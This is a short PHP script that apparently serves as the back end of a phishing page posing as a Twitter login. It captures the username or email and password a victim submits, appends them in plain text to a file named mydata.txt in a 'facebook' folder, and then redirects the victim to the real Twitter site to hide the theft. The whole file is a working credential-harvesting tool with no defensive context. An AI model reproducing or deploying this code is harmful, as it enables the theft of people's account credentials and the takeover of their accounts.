<?php

file_put_contents("../facebook/mydata.txt", "Twitter Username: " . $_POST['usernameOrEmail'] . " Password: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/');
exit();
                                                                  
